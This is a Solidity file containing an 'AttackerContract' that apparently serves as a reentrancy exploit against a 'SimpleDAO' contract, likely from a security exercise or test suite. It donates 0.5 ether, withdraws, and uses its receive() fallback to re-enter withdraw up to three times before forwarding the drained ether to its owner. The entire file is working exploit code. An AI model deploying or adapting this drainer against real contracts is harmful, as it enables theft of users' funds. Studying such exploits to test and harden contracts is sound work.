// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "src/contracts/interfaces/ISimpleDAO.sol";

contract AttackerContract {
    ISimpleDAO public dao;
    address payable public owner;
    uint256 private constant ATTACK_AMOUNT = 0.5 ether;
    uint256 private withdrawCount;
    uint256 private constant MAX_WITHDRAWS = 3;
    bool private attacking;
    
    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Insufficient funds for attack");
        require(!attacking, "Attack in progress");
        
        // Start attack
        attacking = true;
        withdrawCount = 0;

        // Initial donation
        dao.donate{value: ATTACK_AMOUNT}();
        
        // Start the attack
        uint256 toWithdraw = ATTACK_AMOUNT;
        dao.withdraw(toWithdraw);
        
        // End attack
        attacking = false;
        
        // Return funds to owner
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = owner.call{value: balance}("");
            require(success, "Failed to send Ether");
        }
    }

    receive() external payable {
        if (attacking && withdrawCount < MAX_WITHDRAWS) {
            withdrawCount++;
            uint256 toWithdraw = ATTACK_AMOUNT;

            // Ensure that the DAO has enough balance for withdrawal
            uint256 daoBalance = address(dao).balance;
            if (daoBalance >= toWithdraw) {
                try dao.withdraw(toWithdraw) {
                    // Successfully withdrawn
                } catch {
                    // Failed to withdraw, stop attack
                }
            }
        }
    }
}
